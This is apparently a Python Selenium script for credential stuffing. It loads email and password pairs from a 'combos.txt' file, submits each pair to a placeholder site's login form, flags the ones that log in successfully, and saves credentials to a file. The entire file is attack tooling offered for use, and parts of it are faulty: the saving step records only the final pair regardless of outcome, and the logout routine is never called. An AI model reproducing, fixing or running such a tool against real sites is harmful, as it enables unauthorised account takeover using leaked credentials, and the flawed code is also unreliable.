from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import random
import os
import sys
from termcolor import colored
# Chemin vers le WebDriver
driver_path = webdriver.Chrome()
driver = (driver_path)
driver.get("url here")
# Fonction pour tester les combinaisons de connexion
def test_login(email, password):
    try:
        driver.get("url here with login session")
        time.sleep(1)  # Laisser le temps à la page de charger

        # Trouver les champs de saisie pour l'e-mail et le mot de passe
        email_field = driver.find_element_by_id("email")
        password_field = driver.find_element_by_id("password")

        # Entrer les données de connexion
        email_field.send_keys(email)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)  # Appuyer sur Entrée pour soumettre le formulaire

        time.sleep(1)  # Attendre la réponse du serveur
        
   # Vérifier si la connexion a réussi
        if "These credentials do not match our records." not in driver.page_source:
            print(colored(f"Successfully logged in with email: {email} and password: {password}",'green'))
        else:
            print(colored(f"Échec de la connexion pour {email}",'red'))
    except Exception as e:
        print(f"Une erreur est survenue pour {email}: {str(e)}") 
        
def logout():
    try:
        # Find and click on the logout button
        logout_button = driver.find_element(By.XPATH, "//button[contains(text(),'LOGOUT')]")
        logout_button.click()
        # Wait for the logout to complete
        time.sleep(2)
        # Check if logout is successful
        if "Login" in driver.page_source:
            print("Successfully logged out")
        else:
            print("Logout failed")
    except Exception as e:
        print(f"An error occurred during logout: {str(e)}")
        driver.quit()  
# Lire les combinaisons d'un fichier
with open("combos.txt", "r") as file:
    for line in file:
        email, password = line.strip().split(',')
        test_login(email, password)
# Open a file to write the successful login credentials
with open("successful_logins.txt", "a") as file:
    file.write(f"Email: {email}, Password: {password}\n")        
        

driver.quit()
